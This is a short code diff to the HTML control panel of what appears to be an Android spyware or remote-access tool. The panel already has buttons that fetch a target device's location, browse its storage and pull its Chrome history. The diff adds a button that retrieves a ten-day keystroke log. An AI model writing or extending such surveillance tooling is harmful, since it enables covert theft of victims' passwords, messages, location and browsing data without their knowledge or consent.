@@ -330,6 +330,7 @@ HTML = r'''<!DOCTYPE html>
                     <button class="cmd-btn" onclick="sendCmd('get_location')">Get Location</button>
                     <button class="cmd-btn file-btn" onclick="sendCmd('scan_files', {path: '/storage/emulated/0'})">Browse Files (Root)</button>
                     <button class="cmd-btn" onclick="sendCmd('get_chrome_history')">Chrome History</button>
+                    <button class="cmd-btn" onclick="sendCmd('get_keystroke_log', {days: 10})">Get Keystrokes (10d)</button>
                     <button class="cmd-btn danger" onclick="sendCmd('ping')">Ping</button>
                 </div>
             </div>
